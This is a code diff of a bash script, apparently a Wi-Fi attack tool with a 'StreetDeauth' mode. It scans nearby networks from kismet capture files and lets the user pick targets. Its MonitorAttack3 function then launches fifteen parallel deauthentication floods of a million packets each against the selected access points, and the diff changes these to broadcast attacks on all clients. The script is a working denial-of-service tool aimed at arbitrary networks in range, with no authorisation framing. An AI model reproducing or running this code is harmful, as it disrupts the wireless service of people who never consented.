@@ -199,7 +199,11 @@ StreetDeauth(){
             echo 
             echo 
              MonitorMode2
-                MonitorAttack3
+             maker
+             showingstreet 
+             varStreets 
+             MonitorAttack3
+        
 
 }
 
@@ -248,7 +252,8 @@ $AirMonitor start $Interface >> /dev/null
 echo starting monitor mode with $Interface
 sleep 2
 echo Scanning Networks...
-
+echo ""
+}
 
 #### Files maker ####
 
@@ -257,75 +262,22 @@ sudo ./maker.sh
 }
 
 
-sleep 10 ; kill $!
-
+showingstreet(){
+echo Note this its the show of just one capture file but you have to assume that all files have detected the near networks in the procces of creation of this lasts...
 echo showing networks available...
-
-sed -i '1d' generated-01.kismet.csv
-clear
-sed -i '1d' generated-02.kismet.csv
-clear
-sed -i '1d' generated-03.kismet.csv
-clear
-sed -i '1d' generated-04.kismet.csv
-clear
-sed -i '1d' generated-05.kismet.csv
-clear
-sed -i '1d' generated-06.kismet.csv
-clear
-sed -i '1d' generated-07.kismet.csv
-clear
-sed -i '1d' generated-08.kismet.csv
-clear
-sed -i '1d' generated-09.kismet.csv
-clear
-sed -i '1d' generated-10.kismet.csv
-clear
-sed -i '1d' generated-11.kismet.csv
-clear
-sed -i '1d' generated-12.kismet.csv
-clear
-sed -i '1d' generated-13.kismet.csv
-clear
-sed -i '1d' generated-14.kismet.csv
-clear
-sed -i '1d' generated-15.kismet.csv
-
+ 
+ sed -i '1d' generated-01.kismet.csv
 
 echo  "\n\n${Red}SerialNo        WiFi Network${White}"
 
 cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-02.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-03.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-04.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-05.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-06.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-07.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-08.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-09.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-10.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-11.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-12.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-13.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-14.kismet.csv | nl -n ln -w 8
-clear
-cut -d ";" -f 3 generated-15.kismet.csv | nl -n ln -w 8
 
-#### Variables list ####
+}
 
+
+#### Variables list + inputs ####
+
+varStreets(){
 targetNumber=1000
 targetNumber2=1000
 targetNumber3=1000
@@ -508,25 +460,28 @@ channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
 
 clear
 
-rm generated-01.kismet.csv 2> /dev/null
+
+
 echo  "Preparing for attack..."
 sleep 3
 
 MonitorAttack3
+
 }
+
 
 MonitorAttack3(){
 
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid1 -c $bssid1 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid2 -c $bssid2 $wifiInterfaceMon >> /dev/null &&
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid3 -c $bssid3 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid4 -c $bssid4 $wifiInterfaceMon >> /dev/null &&
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid5 -c $bssid5 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid6 -c $bssid6 $wifiInterfaceMon >> /dev/null &&
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid7 -c $bssid7 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid8 -c $bssid8 $wifiInterfaceMon >> /dev/null &&
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid9 -c $bssid9 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid10 -c $bssid10 $wifiInterfaceMon >> /dev/null &&
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid11 -c $bssid11 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid12 -c $bssid12 $wifiInterfaceMon >> /dev/null &&
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid13 -c $bssid13 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid14 -c $bssid14 $wifiInterfaceMon >> /dev/null &&  
-sudo $Tool -e $AirAttack -0 1000000 -a $bssid15 -c $bssid15 $wifiInterfaceMon >> /dev/null 
 
-InterMsg3
+sudo $Tool -e $AirAttack -0 1000000 -a $bssid1 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid2 $wifiInterfaceMon >> /dev/null &
+sudo $Tool -e $AirAttack -0 1000000 -a $bssid3 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid4 $wifiInterfaceMon >> /dev/null &
+sudo $Tool -e $AirAttack -0 1000000 -a $bssid5 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid6 $wifiInterfaceMon >> /dev/null &
+sudo $Tool -e $AirAttack -0 1000000 -a $bssid7 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid8 $wifiInterfaceMon >> /dev/null &
+sudo $Tool -e $AirAttack -0 1000000 -a $bssid9 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid10  $wifiInterfaceMon >> /dev/null &
+sudo $Tool -e $AirAttack -0 1000000 -a $bssid11  $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid12  $wifiInterfaceMon >> /dev/null &
+sudo $Tool -e $AirAttack -0 1000000 -a $bssid13  $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid14  $wifiInterfaceMon >> /dev/null &  
+sudo $Tool -e $AirAttack -0 1000000 -a $bssid15  $wifiInterfaceMon >> /dev/null 
+
 
 
 }
